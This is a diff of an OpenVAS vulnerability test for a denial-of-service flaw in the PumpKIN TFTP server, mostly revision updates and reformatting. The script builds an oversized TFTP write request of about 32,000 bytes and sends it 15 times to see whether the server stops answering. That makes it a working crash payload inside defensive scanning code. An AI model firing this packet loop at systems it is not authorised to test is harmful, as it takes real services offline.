@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_pumpkin_tftp_server_dos_vuln.nasl 11554 2018-09-22 15:11:42Z cfischer $
+# $Id: secpod_pumpkin_tftp_server_dos_vuln.nasl 13202 2019-01-21 15:19:15Z cfischer $
 #
 # PumpKIN TFTP Server Denial of Service Vulnerability
 #
@@ -29,8 +29,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.900648");
-  script_version("$Revision: 11554 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-22 17:11:42 +0200 (Sat, 22 Sep 2018) $");
+  script_version("$Revision: 13202 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:19:15 +0100 (Mon, 21 Jan 2019) $");
   script_tag(name:"creation_date", value:"2009-05-19 08:03:45 +0200 (Tue, 19 May 2009)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
@@ -43,6 +43,7 @@ if(description)
   script_dependencies("secpod_pumpkin_tftp_detect.nasl", "global_settings.nasl");
   script_mandatory_keys("PumpKIN/TFTP/Ver");
   script_require_udp_ports("Services/udp/tftp", 69);
+  script_require_keys("tftp/detected");
   script_exclude_keys("keys/TARGET_IS_IPV6");
 
   script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/6838");
@@ -72,30 +73,26 @@ if(description)
 
 include("version_func.inc");
 
-if(TARGET_IS_IPV6())exit(0);
+if(TARGET_IS_IPV6())
+  exit(0);
 
 pkPort = get_kb_item("Services/udp/tftp");
-if(!pkPort){
+if(!pkPort)
   pkPort = 69;
-}
 
-if(!get_udp_port_state(pkPort)){
+if(!get_udp_port_state(pkPort))
   exit(0);
-}
 
 function tftp_attack(port, attack)
 {
   local_var req, rep, sport, ip, udp, filter, data, i;
-  if(attack)
-  {
-     # Attack request
-     req1 = crap(length:16, data:"0x00");
-     req2 = crap(length:32000, data:"0x00");
-     req = raw_string(0x00, 0x02) + req1 + raw_string(0x00) + req2 + raw_string(0x00);
-  }
-  else{
-     req = raw_string(0x00, 0x01) + "SecPod" +  raw_string(0x00) +
-                                    "netascii" + raw_string(0x00);
+  if(attack) {
+    req1 = crap(length:16, data:"0x00");
+    req2 = crap(length:32000, data:"0x00");
+    req = raw_string(0x00, 0x02) + req1 + raw_string(0x00) + req2 + raw_string(0x00);
+  } else {
+    req = raw_string(0x00, 0x01) + "SecPod" +  raw_string(0x00) +
+                                   "netascii" + raw_string(0x00);
   }
 
   ip = forge_ip_packet(ip_hl:5, ip_v:4, ip_tos:0, ip_len:20,
@@ -127,23 +124,21 @@ function tftp_attack(port, attack)
 
 if(!safe_checks())
 {
-  if(!tftp_attack(port:pkPort, attack:FALSE)){
+  if(!tftp_attack(port:pkPort, attack:FALSE))
     exit(0);
-  }
 
-  # Multiple attack iterations
-  for(i=0; i<15; i++){
+  for(i=0; i<15; i++) {
     alive = tftp_attack(port:pkPort, attack:TRUE);
   }
 
   if(!tftp_attack(port:pkPort, attack:FALSE)){
-    security_message(pkPort, proto:"udp");
+    security_message(port:pkPort, proto:"udp");
   }
   exit(0);
 }
 
 pumpKINVer = get_kb_item("PumpKIN/TFTP/Ver");
-if(pumpKINVer != NULL)
+if(pumpKINVer)
 {
   if(version_is_less_equal(version:pumpKINVer, test_version:"2.7.2.0")){
     security_message(pkPort, proto:"udp");
